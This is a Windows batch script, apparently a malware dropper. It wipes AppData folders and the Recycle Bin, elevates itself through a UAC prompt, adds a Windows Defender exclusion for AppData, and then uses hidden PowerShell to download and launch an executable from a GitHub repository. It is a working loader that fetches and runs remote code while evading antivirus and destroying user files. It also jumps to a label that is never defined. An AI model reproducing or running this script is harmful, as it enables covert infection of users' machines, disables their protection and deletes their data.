@echo off

:: Set paths early
set "APPDATA_PATH=%USERPROFILE%\AppData"
set "SUBDIR=%APPDATA_PATH%\Roaming\SubDir"
set "TRACES_DIR=%APPDATA_PATH%\Roaming\Traces"
set "TARGET_FILE=%TRACES_DIR%\Client-built.exe"
set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"

:: Delete SubDir and Traces contents
if exist "%SUBDIR%" (
    rmdir /s /q "%SUBDIR%"
)
if exist "%TRACES_DIR%" (
    rmdir /s /q "%TRACES_DIR%"
)
mkdir "%SUBDIR%"
mkdir "%TRACES_DIR%"

:: Silent Recycle Bin Wipe
powershell -WindowStyle Hidden -Command "$null = (New-Object -ComObject Shell.Application).NameSpace(0xA).Items() | ForEach-Object { Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue }"

:: Check internet
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    timeout /t 5 /nobreak >nul 2>&1
    goto CheckInternet
)

:: Check admin privileges
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Defender Exclusion
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"

:: Download and run client
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
start "" "%TARGET_FILE%"
exit

:: By MrAboudi
:: v3
